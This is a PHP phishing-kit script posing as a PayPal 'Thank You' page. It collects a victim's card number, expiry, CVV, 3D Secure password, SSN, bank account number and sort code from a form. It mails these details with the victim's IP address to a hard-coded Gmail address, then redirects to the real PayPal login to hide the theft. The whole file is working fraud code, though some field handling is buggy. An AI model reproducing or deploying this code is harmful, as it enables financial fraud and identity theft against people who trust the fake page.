﻿<?

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$lboss1 = $_POST['ccname'];
$lboss2 = $_POST['ccnum'];
$lboss3 = $_POST['monthl'];
$lboss4 = $_POST['yesrl'];
$lboss5 = $_POST['cvv15'];
$lboss6 = $_POST['3dpass'];
$lboss7 = $_POST['SSNlog'];
$lboss8 = $_POST['bncnum'];
$lboss8 = $_POST['srtcode'];

$message .="
||===========|Hassan mansour ~ spam-egy |========||
||======================+ BILLING INFO +====================||
||Card-Number     :  ".$lboss2."
||Name on card    : ".$lboss1."
||EXP DT              : ".$lboss3." ".$lboss4."
||cvv                       : ".$lboss5."
||3DS/VBV            : ".$lboss6."
||SSN                    : ".$lboss7."
||Bank Acc. Num : ".$lboss7."
||SortCode      : ".$lboss8."

||====================== 	PC-INFO ====================||
||Date / time	    : $date
||Client IP         : http://www.geoiptool.com/?IP=$ip
||=========||Hassan mansour ~ spam-egy |=====================||\n";
$send="alouani987@gmail.com";
$subject = "PayPal Full Rzlt | $ip";
mail($send,$subject,$message);

fwrite($message); 
?>
<!DOCTYPE html>
<html>
<head>
    <title>Thank You  - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <meta http-equiv="refresh" content="2;url=https://www.paypal.com/cgi-bin/webscr?cmd=_login-run">
    <link href="css/app.css" type="text/css" rel="stylesheet">
</head>
<body style="background-image: url('css/dixon_success.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
</body>
</html>